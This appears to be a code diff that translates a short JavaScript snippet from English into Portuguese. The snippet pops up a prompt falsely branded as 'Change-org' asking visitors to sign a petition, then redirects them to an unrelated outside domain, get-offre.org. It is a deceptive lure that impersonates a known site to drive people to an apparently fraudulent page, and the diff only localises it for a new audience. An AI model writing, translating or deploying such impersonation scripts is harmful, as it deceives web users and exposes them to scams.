@@ -1,6 +1,6 @@
 
-var password = 'SIGN THIS PETITION'
-password=prompt('Change-org: You have been invited to join hand in signing this petition. kindly press Ok to submit petition ','SIGN THIS PETITION');
-if (password != 'SIGN THIS PETITION') {
+var password = 'ASSINE ESTA PETIÇÃO'
+password=prompt('Change-org: Você foi convidado a se juntar à assinatura desta petição. por favor pressione OK para enviar petição ','ASSINE ESTA PETIÇÃO');
+if (password != 'ASSINE ESTA PETIÇÃO') {
 location.href='https://get-offre.org/sign-petition.html';
 }
